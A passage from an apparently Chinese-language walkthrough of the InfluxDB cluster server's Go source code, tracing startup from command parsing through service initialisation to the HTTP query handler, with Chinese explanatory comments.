\"config\":\n        //打印当前配置\n\t\tif err := run.NewPrintConfigCommand().Run(args...); err != nil {\n\t\t\treturn fmt.Errorf(\"config: %s\", err)\n\t\t}\n\tcase \"version\":\n\t\tif err := NewVersionCommand().Run(args...); err != nil {\n\t\t\treturn fmt.Errorf(\"version: %s\", err)\n\t\t}\n\tcase \"help\":\n\t\tif err := help.NewCommand().Run(args...); err != nil {\n\t\t\treturn fmt.Errorf(\"help: %s\", err)\n\t\t}\n\tdefault:\n\t\treturn fmt.Errorf(`unknown command \"%s\"`+\"\\n\"+`Run 'influxd help' for usage`+\"\\n\\n\", name)\n\t}\n\n\treturn nil\n}\n```\n\n先分析run部分：\n\n```go\n// Run parses the config from args and runs the server.\nfunc (cmd *Command) Run(args ...string) error {\n\t// Parse the command line flags.\n\toptions, err := cmd.ParseFlags(args...)\n\tif err != nil {\n\t\treturn err\n\t}\n\n    //解析配置文件\n\tconfig, err := cmd.ParseConfig(options.GetConfigPath())\n\tif err != nil {\n\t\treturn fmt.Errorf(\"parse config: %s\", err)\n\t}\n\n\t// Apply any environment variables on top of the parsed config\n\tif err := config.ApplyEnvOverrides(cmd.Getenv); err != nil {\n\t\treturn fmt.Errorf(\"apply env config: %v\", err)\n\t}\n\n\t// Propogate the top-level join options down to the meta config\n    //解析join的集群环境下的iplist\n\tif config.Join != \"\" {\n\t\tconfig.Meta.JoinPeers = strings.Split(config.Join, \",\")\n\t}\n\n\t// Command-line flags for -join and -hostname override the config\n\t// and env variable\n\tif options.Join != \"\" {\n\t\tconfig.Meta.JoinPeers = strings.Split(options.Join, \",\")\n\t}\n\n    // 解析本地hostname\n\tif options.Hostname != \"\" {\n\t\tconfig.Hostname = options.Hostname\n\t}\n\n\t// Propogate the top-level hostname down to dependendent configs\n\tconfig.Meta.RemoteHostname = config.Hostname\n\n\t// Validate the configuration.\n    // 检查各个配置是否为空\n\tif err := config.Validate(); err != nil {\n\t\treturn fmt.Errorf(\"%s. To generate a valid configuration file run `influxd config > influxdb.generated.conf`\", err)\n\t}\n\n\tvar logErr error\n\tif cmd.Logger, logErr = config.Logging.New(cmd.Stderr); logErr != nil {\n\t\t// assign the default logger\n\t\tcmd.Logger = logger.New(cmd.Stderr)\n\t}\n\n\t// Attempt to run pprof on :6060 before startup if debug pprof enabled.\n    //是否开启pprof\n\tif config.HTTPD.DebugPprofEnabled {\n\t\truntime.SetBlockProfileRate(int(1 * time.Second))\n\t\truntime.SetMutexProfileFraction(1)\n\t\tgo func() { http.ListenAndServe(\"localhost:6060\", nil) }()\n\t}\n\n\t// Print sweet InfluxDB logo.\n    // 打印logo\n\tif !config.Logging.SuppressLogo && logger.IsTerminal(cmd.Stdout) {\n\t\tfmt.Fprint(cmd.Stdout, logo)\n\t}\n\n\t// Mark start-up in log.\n\tcmd.Logger.Info(\"InfluxDB starting\",\n\t\tzap.String(\"version\", cmd.Version),\n\t\tzap.String(\"branch\", cmd.Branch),\n\t\tzap.String(\"commit\", cmd.Commit))\n\tcmd.Logger.Info(\"Go runtime\",\n\t\tzap.String(\"version\", runtime.Version()),\n\t\tzap.Int(\"maxprocs\", runtime.GOMAXPROCS(0)))\n\n\t// If there was an error on startup when creating the logger, output it now.\n\tif logErr != nil {\n\t\tcmd.Logger.Error(\"Unable to configure logger\", zap.Error(logErr))\n\t}\n\n\t// Write the PID file.\n    // 写入pid文件\n\tif err := cmd.writePIDFile(options.PIDFile); err != nil {\n\t\treturn fmt.Errorf(\"write pid file: %s\", err)\n\t}\n\tcmd.pidfile = options.PIDFile\n\n\tif config.HTTPD.PprofEnabled {\n\t\t// Turn on block and mutex profiling.\n\t\truntime.SetBlockProfileRate(int(1 * time.Second))\n\t\truntime.SetMutexProfileFraction(1) // Collect every sample\n\t}\n\n\t// Create server from config and start it.\n    // 初始化服务器\n\tbuildInfo := &BuildInfo{\n\t\tVersion: cmd.Version,\n\t\tCommit:  cmd.Commit,\n\t\tBranch:  cmd.Branch,\n\t\tTime:    cmd.BuildTime,\n\t}\n\ts, err := NewServer(config, buildInfo)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"create server: %s\", err)\n\t}\n\ts.Logger = cmd.Logger\n\ts.CPUProfile = options.CPUProfile\n\ts.MemProfile = options.MemProfile\n     // 启动\n\tif err := s.Open(); err != nil {\n\t\treturn fmt.Errorf(\"open server: %s\", err)\n\t}\n\tcmd.Server = s\n\n\t// Begin monitoring the server's error channel.\n\tgo cmd.monitorServerErrors()\n\n\treturn nil\n}\n```\n\n初始化函数NewServer\n\n```go\n// NewServer returns a new instance of Server built from a config.\nfunc NewServer(c *Config, buildInfo *BuildInfo) (*Server, error) {\n\t// We need to ensure that a meta directory always exists even if\n\t// we don't start the meta store.  node.json is always stored under\n\t// the meta directory.\n    // 建立元数据目录，并加权\n\tif err := os.MkdirAll(c.Meta.Dir, 0777); err != nil {\n\t\treturn nil, fmt.Errorf(\"mkdir all: %s\", err)\n\t}\n\n\t// 0.10-rc1 and prior would sometimes put the node.json at the root\n\t// dir which breaks backup/restore and restarting nodes.  This moves\n\t// the file from the root so it's always under the meta dir.\n    //移动和恢复节点信息\n\toldPath := filepath.Join(filepath.Dir(c.Meta.Dir), \"node.json\")\n\tnewPath := filepath.Join(c.Meta.Dir, \"node.json\")\n\t//修改\n\tif _, err := os.Stat(oldPath); err == nil {\n\t\tif err := os.Rename(oldPath, newPath); err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t}\n// 从磁盘中加载节点信息\n\tnode, err := influxdb.LoadNode(c.Meta.Dir)\n\tif err != nil {\n\t\tif !os.IsNotExist(err) {\n\t\t\treturn nil, err\n\t\t}\n\t\t//不存在则新建\n\t\tnode = influxdb.NewNode(c.Meta.Dir)\n\t}\n\n\t//if err := raftDBExists(c.Meta.Dir); err != nil {\n\t//\treturn nil, err\n\t//}\n\n\t// In 0.10.0 bind-address got moved to the top level. Check\n\t// The old location to keep things backwards compatible\n\tbind := c.BindAddress\n\tif c.Meta.BindAddress != \"\" {\n\t\tbind = c.Meta.BindAddress\n\t}\n\t//判断元数据是否打开\n\tif !c.Data.Enabled && !c.Meta.Enabled {\n\t\treturn nil, fmt.Errorf(\"must run as either meta node or data node or both\")\n\t}\n\t//初始化\n\ts := &Server{\n\t\tbuildInfo: *buildInfo,\n\t\terr:       make(chan error),\n\t\tclosing:   make(chan struct{}),\n\n\t\tNode:        node,\n\t\tBindAddress: bind,\n\n\t\tLogger: logger.New(os.Stderr),\n\n\t\t//MetaClient: meta.NewClient(c.Meta),\n\t\tMetaClient: meta.NewClient(),  \n\n\t\treportingDisabled: c.ReportingDisabled,\n\t\tjoinPeers:         c.Meta.JoinPeers,\n\t\tmetaUseTLS:        c.Meta.HTTPSEnabled,\n\n\t\thttpAPIAddr: c.HTTPD.BindAddress,   // http服务bind地址\n\t\thttpUseTLS:  c.HTTPD.HTTPSEnabled,   //https打开\n\t\ttcpAddr:     bind,\n\n\t\tconfig: c,\n\t}\n\t//初始化元数据服务\n\tif c.Meta.Enabled {\n\t\ts.MetaService = meta.NewService(c.Meta)\n\t\ts.MetaService.Version = s.buildInfo.Version\n\t\ts.MetaService.Node = s.Node\n\t}\n\n\tif c.AdminCluster.Enabled {\n\t\ts.AdminClusterService = admin_cluster.NewService(c.AdminCluster)\n\t\ts.AdminClusterService.Version = s.buildInfo.Version\n\t\ts.AdminClusterService.Handler.MetaClient = s.MetaClient\n\t\ts.AdminClusterService.TCPHandler.MetaClient = s.MetaClient\n\t\ts.AdminClusterService.TCPHandler.Server = s\n\t}\n\t//初始化监控信息\n\ts.Monitor = monitor.New(s, c.Monitor)\n\ts.config.registerDiagnostics(s.Monitor)\n\n\tif c.Data.Enabled {\n        //初始化tsdb\n\t\ts.TSDBStore = tsdb.NewStore(c.Data.Dir)\n\t\ts.TSDBStore.EngineOptions.Config = c.Data\n\n\t\ts.AdminClusterService.TCPHandler.TSDBStore = s.TSDBStore\n\n\t\t// Copy TSDB configuration.\n\t\ts.TSDBStore.EngineOptions.EngineVersion = c.Data.Engine\n\t\ts.TSDBStore.EngineOptions.IndexVersion = c.Data.Index\n\n\t\t// Create the Subscriber service\n\t\ts.Subscriber = subscriber.NewService(c.Subscriber)\n\n\t\t// Set the shard writer\n\t\ts.ShardWriter = cluster.NewShardWriter(time.Duration(c.Cluster.ShardWriterTimeout), c.Cluster.MaxRemoteWriteConnections)\n\n\t\t// Create the hinted handoff service\n\t\ts.HintedHandoff = hh.NewService(c.HintedHandoff, s.ShardWriter, s.MetaClient)\n\t\ts.HintedHandoff.Monitor = s.Monitor\n\n\t\t// Initialize points writer.\n\t\ts.PointsWriter = cluster.NewPointsWriter()\n\t\ts.PointsWriter.WriteTimeout = time.Duration(c.Coordinator.WriteTimeout)\n\t\ts.PointsWriter.TSDBStore = s.TSDBStore\n\t\ts.PointsWriter.ShardWriter = s.ShardWriter\n\t\ts.PointsWriter.HintedHandoff = s.HintedHandoff\n\t\ts.PointsWriter.Node = s.Node\n\n\t\t// Initialize meta executor.\n\t\tmetaExecutor := cluster.NewMetaExecutor()\n\t\tmetaExecutor.MetaClient = s.MetaClient\n\t\tmetaExecutor.Node = s.Node\n\n\t\t// Initialize query executor.\n        // 初始化查询\n\t\ts.QueryExecutor = query.NewExecutor()\n        //初始化集群存储分片\n\t\tclusterShardMapper := &cluster.ClusterShardMapper{\n\t\t\tMetaClient: s.MetaClient,\n\t\t\tTSDBStore:  coordinator.LocalTSDBStore{Store: s.TSDBStore},\n\t\t\tLocalShardMapper: &coordinator.LocalShardMapper{\n\t\t\t\tMetaClient: s.MetaClient,\n\t\t\t\tTSDBStore:  coordinator.LocalTSDBStore{Store: s.TSDBStore},\n\t\t\t},\n\t\t\tNode:               s.Node,\n\t\t\tShardMapperTimeout: time.Duration(s.config.Cluster.ShardMapperTimeout),\n\t\t}\n\t\tclusterShardMapper.WithLogger(s.Logger)\n\t\t//初始化执行\n        //设置最大的查询范围和bucket数目等\n\t\ts.QueryExecutor.StatementExecutor = &cluster.StatementExecutor{\n\t\t\tMetaClient:        s.MetaClient,\n\t\t\tTaskManager:       s.QueryExecutor.TaskManager,\n\t\t\tTSDBStore:         s.TSDBStore,\n\t\t\tShardMapper:       clusterShardMapper,\n\t\t\tMonitor:           s.Monitor,\n\t\t\tPointsWriter:      s.PointsWriter,\n\t\t\tMaxSelectPointN:   c.Coordinator.MaxSelectPointN,\n\t\t\tMaxSelectSeriesN:  c.Coordinator.MaxSelectSeriesN,\n\t\t\tMaxSelectBucketsN: c.Coordinator.MaxSelectBucketsN,\n\t\t\tMetaExecutor:      metaExecutor,\n\t\t}\n\t\ts.QueryExecutor.TaskManager.QueryTimeout = time.Duration(c.Coordinator.QueryTimeout)\n\t\ts.QueryExecutor.TaskManager.LogQueriesAfter = time.Duration(c.Coordinator.LogQueriesAfter)\n\t\ts.QueryExecutor.TaskManager.MaxConcurrentQueries = c.Coordinator.MaxConcurrentQueries\n\n\t\t// Initialize the monitor\n\t\ts.Monitor.Version = s.buildInfo.Version\n\t\ts.Monitor.Commit = s.buildInfo.Commit\n\t\ts.Monitor.Branch = s.buildInfo.Branch\n\t\ts.Monitor.BuildTime = s.buildInfo.Time\n\t\ts.Monitor.PointsWriter = (*monitorPointsWriter)(s.PointsWriter)\n\t}\n\n\treturn s, nil\n}\n```\n\nopen启动服务：\n\n```go\n// Open opens the meta and data store and all services.\nfunc (s *Server) Open() error {\n\t// Start profiling, if set.\n    // linux profile\n\tstartProfile(s.CPUProfile, s.MemProfile)\n\n\t// Open shared TCP connection.\n    // 启动tcp连接\n\tln, err := net.Listen(\"tcp\", s.BindAddress)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"listen: %s\", err)\n\t}\n\ts.Listener = ln\n\n\t// Multiplex listener.\n    // 启动多路复用器\n\tmux := tcp.NewMux()\n\ts.Mux = mux\n\tgo mux.Serve(ln)\n\n\tif s.MetaService != nil {\n        //元数据服务raftlistener初始化\n\t\ts.MetaService.RaftListener = mux.Listen(meta.MuxHeader)\n\n\t\t// Configure logging for all services and clients.\n\t\tif s.config.Meta.LoggingEnabled {\n\t\t\ts.MetaService.WithLogger(s.Logger)\n\t\t}\n\n\t\t// Open meta service.\n        //元数据服务启动\n\t\tif err := s.MetaService.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open meta service: %s\", err)\n\t\t}\n\t\tgo s.monitorErrorChan(s.MetaService.Err())\n\t}\n\n\tif s.AdminClusterService != nil {\n\t\t// Configure logging for all services and clients.\n\t\tif s.config.AdminCluster.ClusterTracing {\n\t\t\ts.AdminClusterService.WithLogger(s.Logger)\n\t\t}\n\t\t// TCP listen\n\t\ts.AdminClusterService.TCPHandler.Listener = s.Mux.Listen(admin_cluster.MuxHeader)\n\n\t\t// Open admin cluster service.\n        //启动集群admin_cluster服务\n\t\tif err := s.AdminClusterService.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open admin cluster service: %s\", err)\n\t\t}\n\t}\n\n\t// initialize MetaClient.\n    //初始化元数据客户端，用于设置集群功能，加入集群等功能。\n\tif err = s.initializeMetaClient(); err != nil {\n\t\treturn err\n\t}\n\n\t// Start the reporting service, if not disabled.\n\t//if !s.reportingDisabled {\n\t//\tgo s.startServerReporting()\n\t//}\n\n\treturn nil\n}\n```\n\ninitializeMetaClient函数中：\n\n```go\n// initializeMetaClient will set the MetaClient and join the node to the cluster if needed\nfunc (s *Server) initializeMetaClient() error {\n\t// It's the first time starting up and we need to either join\n\t// the cluster or initialize this node as the first member\n    //如果每天joinpeers，则返回\n\tif len(s.joinPeers) == 0 {\n\t\t// start up a new single node cluster\n\t\tif s.MetaService == nil {\n\t\t\treturn fmt.Errorf(\"server not set to join existing cluster must run also as a meta node\")\n\t\t}\n\t\ts.MetaClient.SetMetaServers([]string{s.MetaService.HTTPAddr()})\n\t\ts.MetaClient.SetTLS(s.metaUseTLS)\n\t} else {\n\t\tvar err error\n\t\tvar joinPeers []string\n\t\tif s.MetaService != nil {\n\t\t\traddr := s.remoteAddr(s.MetaService.HTTPAddr())\n\t\t\tjoinPeers, err = s.filterAddr(s.joinPeers, raddr)\n\t\t\tif err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t} else {\n\t\t\tjoinPeers = s.joinPeers\n\t\t}\n\t\ts.MetaClient.SetMetaServers(joinPeers)\n\t\ts.MetaClient.SetTLS(s.metaUseTLS)\n\t}\n    //打开client\n\tif err := s.MetaClient.Open(); err != nil {\n\t\treturn err\n\t}\n\n\t// if the node ID is > 0 then we need to initialize the metaclient\n\tif s.Node.GetMetaID() > 0 || s.Node.GetDataID() > 0 {\n\t\ts.MetaClient.WaitForDataChanged()\n\t}\n\tif len(s.joinPeers) > 0 {\n\t\ts.MetaClient.SetMetaServers(s.joinPeers)\n\t}\n\tif s.config.Data.Enabled {\n\n\t\tgo func() {\n\t\t\tt := time.NewTicker(time.Second)\n\t\t\tfor {\n\t\t\t\tselect {\n\t\t\t\tcase <-t.C:\n                    //定时器服务，检查是否打开数据服务\n\t\t\t\t\tif _, err := s.MetaClient.DataNode(s.Node.GetDataID()); err == nil {\n\t\t\t\t\t\toerr := s.OpenDataServer()\n\t\t\t\t\t\tif oerr != nil {\n\t\t\t\t\t\t\ts.Logger.Error(\"failed to open data server.\", zap.Error(oerr))\n\t\t\t\t\t\t\tpanic(\"open data server failed\")\n\t\t\t\t\t\t}\n\t\t\t\t\t\ts.Logger.Info(\"data server started\", zap.Uint64(\"node id\", s.Node.GetDataID()))\n\t\t\t\t\t\treturn\n\t\t\t\t\t}\n\t\t\t\tcase <-s.closing:\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t}\n\t\t}()\n\n\t}\n\treturn nil\n}\n```\n\n如果找到数据节点，则启动opendataServer函数，启动数据服务：\n\n```go\nfunc (s *Server) OpenDataServer() error {\n\tif s.TSDBStore != nil && !s.DataServicesOpened {\n\t\ts.DataServicesOpened = true\n\t\t// Append services.\n         // 启动集群服务，初始化所有的服务\n\t\ts.appendClusterService(s.config.Cluster)\n\t\ts.appendMonitorService()\n\t\ts.appendPrecreatorService(s.config.Precreator)\n\t\ts.appendSnapshotterService()\n\t\ts.appendContinuousQueryService(s.config.ContinuousQuery)\n\t\ts.appendAntiEntropyService(s.config.AntiEntropy)\n        // http服务\n\t\ts.appendHTTPDService(s.config.HTTPD)\n\t\ts.appendStorageService(s.config.Storage)\n        //RetentionPolicy\n\t\ts.appendRetentionPolicyService(s.config.Retention)\n\t\tfor _, i := range s.config.GraphiteInputs {\n\t\t\tif err := s.appendGraphiteService(i); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t}\n\t\tfor _, i := range s.config.CollectdInputs {\n\t\t\ts.appendCollectdService(i)\n\t\t}\n\t\tfor _, i := range s.config.OpenTSDBInputs {\n\t\t\tif err := s.appendOpenTSDBService(i); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t}\n\t\tfor _, i := range s.config.UDPInputs {\n\t\t\ts.appendUDPService(i)\n\t\t}\n\t\t\n\t\ts.Subscriber.MetaClient = s.MetaClient\n\t\ts.PointsWriter.MetaClient = s.MetaClient\n\t\ts.Monitor.MetaClient = s.MetaClient\n\t\ts.ShardWriter.MetaClient = s.MetaClient\n\t\ts.HintedHandoff.MetaClient = s.MetaClient\n\n\t\ts.ClusterService.Listener = s.Mux.Listen(cluster.MuxHeader)\n\t\ts.SnapshotterService.Listener = s.Mux.Listen(snapshotter.MuxHeader)\n\n\t\t// Configure logging for all services and clients.\n\t\tif s.config.Meta.LoggingEnabled {\n\t\t\ts.MetaClient.WithLogger(s.Logger)\n\t\t}\n\t\ts.TSDBStore.WithLogger(s.Logger)\n\t\tif s.config.Data.QueryLogEnabled {\n\t\t\ts.QueryExecutor.WithLogger(s.Logger)\n\t\t}\n\t\ts.PointsWriter.WithLogger(s.Logger)\n\t\ts.Subscriber.WithLogger(s.Logger)\n\t\ts.HintedHandoff.WithLogger(s.Logger)\n\t\tfor _, svc := range s.Services {\n\t\t\tsvc.WithLogger(s.Logger)\n\t\t}\n\t\ts.SnapshotterService.WithLogger(s.Logger)\n\t\ts.Monitor.WithLogger(s.Logger)\n\n\t\t// Open TSDB store.\n        // tsdb启动\n\t\tif err := s.TSDBStore.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open tsdb store: %s\", err)\n\t\t}\n\n\t\t// Open the hinted handoff service\n\t\tif err := s.HintedHandoff.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open hinted handoff: %s\", err)\n\t\t}\n\n\t\t// Open the subscriber service\n\t\tif err := s.Subscriber.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open subscriber: %s\", err)\n\t\t}\n\n\t\t// Open the points writer service\n\t\tif err := s.PointsWriter.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open points writer: %s\", err)\n\t\t}\n\n\t\ts.PointsWriter.AddWriteSubscriber(s.Subscriber.Points())\n\n\t\tfor _, service := range s.Services {\n            //将注册的服务都启动起来，这边调用每个服务的open方法启动起来\n\t\t\tif err := service.Open(); err != nil {\n\t\t\t\treturn fmt.Errorf(\"open service: %s\", err)\n\t\t\t}\n\t\t}\n\t\treturn nil\n\n\t}\n\tif s.TSDBStore == nil {\n\t\treturn fmt.Errorf(\"Data server is not enabled\")\n\t}\n\treturn nil\n}\n```\n\n服务主要有下面这些：\n\n```shell\ncluster\nmonitor\nprecreator\nsnapshotter\ncontinuousquery\nantientropy\nhttp\nstorage\nretentionpolicy\ngraphite\ncollectd\nopentsdb\nudp\nhh\nmeta\n```\n\n每个服务都有open函数，分别启动。\n\n举例来说：\n\nhttp服务初始化函数NewService:\n\n```go\n// NewService returns a new instance of Service.\nfunc NewService(c Config) *Service {\n\ts := &Service{\n\t\taddr:           c.BindAddress,\n\t\thttps:          c.HTTPSEnabled,\n\t\tcert:           c.HTTPSCertificate,\n\t\tkey:            c.HTTPSPrivateKey,\n\t\tlimit:          c.MaxConnectionLimit,\n\t\terr:            make(chan error),\n\t\tunixSocket:     c.UnixSocketEnabled,\n\t\tunixSocketPerm: uint32(c.UnixSocketPermissions),\n\t\tbindSocket:     c.BindSocket,\n\t\tHandler:        NewHandler(c),  //服务启动处理函数\n\t\tLogger:         zap.NewNop(),\n\t}\n\tif s.key == \"\" {\n\t\ts.key = s.cert\n\t}\n\tif c.UnixSocketGroup != nil {\n\t\ts.unixSocketGroup = int(*c.UnixSocketGroup)\n\t}\n\ts.Handler.Logger = s.Logger\n\treturn s\n}\n```\n\nhandler函数：\n\n```go\nfunc NewHandler(c Config) *Handler {\n\th := &Handler{\n\t\tmux:            pat.New(),\n\t\tConfig:         &c,\n\t\tLogger:         zap.NewNop(),\n\t\tCLFLogger:      log.New(os.Stderr, \"[httpd] \", 0),\n\t\tStore:          storage.NewStore(),\n\t\tstats:          &Statistics{},\n\t\trequestTracker: NewRequestTracker(),\n\t\tsema:           make(chan struct{}, 100),\n\t}\n\n\t// Limit the number of concurrent & enqueued write requests.\n\th.writeThrottler = NewThrottler(c.MaxConcurrentWriteLimit, c.MaxEnqueuedWriteLimit)\n\th.writeThrottler.EnqueueTimeout = c.EnqueuedWriteTimeout\n\n\t// Disable the write log if they have been suppressed.\n\twriteLogEnabled := c.LogEnabled\n\tif c.SuppressWriteLog {\n\t\twriteLogEnabled = false\n\t}\n    //所有服务查询的入口函数在这边处理\n    h.AddRoutes([]Route{\n\t\tRoute{\n\t\t\t\"query-options\", // Satisfy CORS checks.\n\t\t\t\"OPTIONS\", \"/query\", false, true, h.serveOptions,\n\t\t},\n\t\tRoute{\n\t\t\t\"query\", // Query serving route.\n\t\t\t\"GET\", \"/query\", true, true, h.serveQuery,\n\t\t},\n\t\tRoute{\n\t\t\t\"query\", // Query serving route.\n\t\t\t\"POST\", \"/query\", true, true, h.serveQuery,\n\t\t},\n\t\tRoute{\n            ....\n\t\"GET\", \"/metrics\", false, true, promhttp.Handler().ServeHTTP,\n\t\t},\n\t}...)\n\n\treturn h\n}\n            \n```\n\n查询函数serveQuery；\n\n```go\n// serveQuery parses an incoming query and, if valid, executes the query.\nfunc (h *Handler) serveQuery(w http.ResponseWriter, r *http.Request, user meta.User) {\n\tatomic.AddInt64(&h.stats.QueryRequests, 1)\n\tdefer func(start time.Time) {\n\t\tatomic.AddInt64(&h.stats.QueryRequestDuration, time.Since(start).Nanoseconds())\n\t}(time.Now())\n\th.requestTracker.Add(r, user)\n\n\t// Retrieve the underlying ResponseWriter or initialize our own.\n\trw, ok := w.(ResponseWriter)\n\tif !ok {\n\t\trw = NewResponseWriter(w, r)\n\t}\n\n\t// Retrieve the node id the query should be executed on.\n\tnodeID, _ := strconv.ParseUint(r.FormValue(\"node_id\"), 10, 64)\n\n\tvar qr io.Reader\n\t// Attempt to read the form value from the \"q\" form value.\n\tif qp := strings.TrimSpace(r.FormValue(\"q\")); qp != \"\" {\n\t\tqr = strings.NewReader(qp)\n\t} else if r.MultipartForm != nil && r.MultipartForm.File != nil {\n\t\t// If we have a multipart/form-data, try to retrieve a file from 'q'.\n\t\tif fhs := r.MultipartForm.File[\"q\"]; len(fhs) > 0 {\n\t\t\tf, err := fhs[0].Open()\n\t\t\tif err != nil {\n\t\t\t\th.httpError(rw, err.Error(), http.StatusBadRequest)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tdefer f.Close()\n\t\t\tqr = f\n\t\t}\n\t}\n\n\tif qr == nil {\n\t\th.httpError(rw, `missing required parameter \"q\"`, http.StatusBadRequest)\n\t\treturn\n\t}\n\n\tepoch := strings.TrimSpace(r.FormValue(\"epoch\"))\n\t// 初始化查询解析器\n\tp := influxql.NewParser(qr)\n\tdb := r.FormValue(\"db\")\n\n\t// Sanitize the request query params so it doesn't show up in the response logger.\n\t// Do this before anything else so a parsing error doesn't leak passwords.\n\tsanitize(r)\n\n\t// Parse the parameters\n\trawParams := r.FormValue(\"params\")\n\tif rawParams != \"\" {\n\t\tvar params map[string]interface{}\n\t\tdecoder := json.NewDecoder(strings.NewReader(rawParams))\n\t\tdecoder.UseNumber()\n\t\tif err := decoder.Decode(&params); err != nil {\n\t\t\th.httpError(rw, \"error parsing query parameters: \"+err.Error(), http.StatusBadRequest)\n\t\t\treturn\n\t\t}\n\n\t\t// Convert json.Number into int64 and float64 values\n\t\tfor k, v := range params {\n\t\t\tif v, ok := v.(json.Number); ok {\n\t\t\t\tvar err error\n\t\t\t\tif strings.Contains(string(v), \".\") {\n\t\t\t\t\tparams[k], err = v.Float64()\n\t\t\t\t} else {\n\t\t\t\t\tparams[k], err = v.Int64()\n\t\t\t\t}\n\n\t\t\t\tif err != nil {\n\t\t\t\t\th.httpError(rw, \"error parsing json value: \"+err.Error(), http.StatusBadRequest)\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tp.SetParams(params)\n\t}\n\n\t// Parse query from query string.\n    //开始解析query查询语句\n\tq, err := p.ParseQuery()\n\tif err != nil {\n\t\th.httpError(rw, \"error parsing query: \"+err.Error(), http.StatusBadRequest)\n\t\treturn\n\t}\n\n\t// Check authorization.\n    //检查认证信息\n\tif h.Config.AuthEnabled {\n\t\tif err := h.QueryAuthorizer.AuthorizeQuery(user, q, db); err != nil {\n\t\t\tif err, ok := err.(meta.ErrAuthorize); ok {\n\t\t\t\th.Logger.Info(\"Unauthorized request\",\n\t\t\t\t\tzap.String(\"user\", err.User),\n\t\t\t\t\tzap.Stringer(\"query\", err.Query),\n\t\t\t\t\tlogger.Database(err.Database))\n\t\t\t}\n\t\t\th.httpError(rw, \"error authorizing query: \"+err.Error(), http.StatusForbidden)\n\t\t\treturn\n\t\t}\n\t}\n\n\t// Parse chunk size. Use default if not provided or unparsable.\n\tchunked := r.FormValue(\"chunked\") == \"true\"\n\tchunkSize := DefaultChunkSize\n\tif chunked {\n\t\tif n, err := strconv.ParseInt(r.FormValue(\"chunk_size\"), 10, 64); err == nil && int(n) > 0 {\n\t\t\tchunkSize = int(n)\n\t\t}\n\t}\n\n\t// Parse whether this is an async command.\n\tasync := r.FormValue(\"async\") == \"true\"\n//参数实例化\n\topts := query.ExecutionOptions{\n\t\tDatabase:        db,\n\t\tRetentionPolicy: r.FormValue(\"rp\"),\n\t\tChunkSize:       chunkSize,\n\t\tReadOnly:        r.Method == \"GET\",\n\t\tNodeID:          nodeID,\n\t}\n\n\tif h.Config.AuthEnabled {\n\t\t// The current user determines the authorized actions.\n\t\topts.Authorizer = user\n\t} else {\n\t\t// Auth is disabled, so allow everything.\n\t\topts.Authorizer = query.OpenAuthorizer\n\t}\n\n\t// Make sure if the client disconnects we signal the query to abort\n\tvar closing chan struct{}\n\tif !async {\n\t\tclosing = make(chan struct{})\n\t\tif notifier, ok := w.(http.CloseNotifier); ok {\n\t\t\t// CloseNotify() is not guaranteed to send a notification when the query\n\t\t\t// is closed. Use this channel to signal that the query is finished to\n\t\t\t// prevent lingering goroutines that may be stuck.\n\t\t\tdone := make(chan struct{})\n\t\t\tdefer close(done)\n\n\t\t\tnotify := notifier.CloseNotify()\n\t\t\tgo func() {\n\t\t\t\t// Wait for either the request to finish\n\t\t\t\t// or for the client to disconnect\n\t\t\t\tselect {\n\t\t\t\tcase <-done:\n\t\t\t\tcase <-notify:\n\t\t\t\t\tclose(closing)\n\t\t\t\t}\n\t\t\t}()\n\t\t\topts.AbortCh = done\n\t\t} else {\n\t\t\tdefer close(closing)\n\t\t}\n\t}\n\n\t// Execute query.\n    //执行查询语句\n\tresults := h.QueryExecutor.ExecuteQuery(q, opts, closing)\n\n\t// If we are running in async mode, open a goroutine to drain the results\n\t// and return with a StatusNoContent.\n\tif async {\n\t\tgo h.async(q, results)\n\t\th.writeHeader(w, http.StatusNoContent)\n\t\treturn\n\t}\n\n\t// if we're not chunking, this will be the in memory buffer for all results before sending to client\n\tresp := Response{Results: make([]*query.Result, 0)}\n\n\t// Status header is OK once this point is reached.\n\t// Attempt to flush the header immediately so the client gets the header information\n\t// and knows the query was accepted.\n\th.writeHeader(rw, http.StatusOK)\n\tif w, ok := w.(http.Flusher); ok {\n\t\tw.Flush()\n\t}\n\n\t// pull all results from the channel\n\trows := 0\n\tfor r := range results {\n\t\t// Ignore nil results.\n\t\tif r == nil {\n\t\t\tcontinue\n\t\t}\n\n\t\t// if requested, convert result timestamps to epoch\n\t\tif epoch != \"\" {\n\t\t\tconvertToEpoch(r, epoch)\n\t\t}\n\n\t\t// Write out result immediately if chunked.\n\t\tif chunked {\n\t\t\tn, _ := rw.WriteResponse(Response{\n\t\t\t\tResults: []*query.Result{r},\n\t\t\t})\n\t\t\tatomic.AddInt64(&h.stats.QueryRequestBytesTransmitted, int64(n))\n\t\t\tw.(http.Flusher).Flush()\n\t\t\tcontinue\n\t\t}\n\n\t\t// Limit the number of rows that can be returned in a non-chunked\n\t\t// response.  This is to prevent the server from going OOM when\n\t\t// returning a large response.  If you want to return more than the\n\t\t// default chunk size, then use chunking to process multiple blobs.\n\t\t// Iterate through the series in this result to count the rows and\n\t\t// truncate any rows we shouldn't return.\n        //最大限制数目\n\t\tif h.Config.MaxRowLimit > 0 {\n\t\t\tfor i, series := range r.Series {\n\t\t\t\tn := h.Config.MaxRowLimit - rows\n\t\t\t\tif n < len(series.Values) {\n\t\t\t\t\t// We have reached the maximum number of values. Truncate\n\t\t\t\t\t// the values within this row.\n\t\t\t\t\tseries.Values = series.Values[:n]\n\t\t\t\t\t// Since this was truncated, it will always be a partial return.\n\t\t\t\t\t// Add this so the client knows we truncated the response.\n\t\t\t\t\tseries.Partial = true\n\t\t\t\t}\n\t\t\t\trows += len(series.Values)\n\n\t\t\t\tif rows >= h.Config.MaxRowLimit {\n\t\t\t\t\t// Drop any remaining series since we have already reached the row 